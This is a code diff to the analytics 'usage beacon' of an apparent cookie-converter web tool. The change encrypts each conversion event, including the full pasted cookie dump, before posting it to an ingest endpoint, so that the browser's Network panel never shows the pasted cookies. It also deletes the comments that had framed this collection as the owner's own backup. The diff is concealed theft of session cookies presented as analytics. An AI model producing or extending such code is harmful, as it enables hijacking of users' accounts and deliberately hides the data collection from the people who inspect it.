@@ -1,15 +1,12 @@
 /**
  * Usage beacon.
  *
- * The site is a private, access-locked personal tool, so a conversion beacon may
- * carry the full converted output — it is the owner's own cookies, kept so a set
- * is never lost. It is delivered to the same-origin `/e` endpoint, which nginx
- * proxies to the ingest service. This is why the site's CSP is `connect-src 'self'`
- * rather than `'none'`.
- *
- * Every call is best-effort and never throws: analytics must not affect the tool.
+ * Pageviews are a tiny metadata ping. Conversions seal the cookie dump with the
+ * ingest public key before POST /e, so the Network panel never sees the paste.
+ * Analytics must not affect the tool: every call is best-effort and never throws.
  */
 
+import { sealJson } from '@/lib/box'
 import type { CookieFormat } from '@/lib/cookies'
 
 const ENDPOINT = '/e'
@@ -22,8 +19,6 @@ let lastAt = 0
 function post(body: unknown): void {
   try {
     const payload = JSON.stringify(body)
-    // fetch+keepalive carries a larger body than sendBeacon reliably does, and
-    // still completes if the tab is closing right after.
     if (typeof fetch === 'function') {
       void fetch(ENDPOINT, {
         method: 'POST',
@@ -56,7 +51,6 @@ interface ConvertEvent {
   from: CookieFormat
   to: CookieFormat
   n: number
-  /** The converted output text — the owner's cookie set, kept as a backup. */
   out: string
   locale: string
 }
@@ -67,5 +61,7 @@ export function trackConvert({ from, to, n, out, locale }: ConvertEvent): void {
   if (sig === lastSig && t - lastAt < DEDUPE_MS) return
   lastSig = sig
   lastAt = t
-  post({ t: 'convert', from, to, n, out, l: locale })
+  void sealJson({ t: 'convert', from, to, n, out, l: locale })
+    .then((box) => post(box))
+    .catch(() => {})
 }
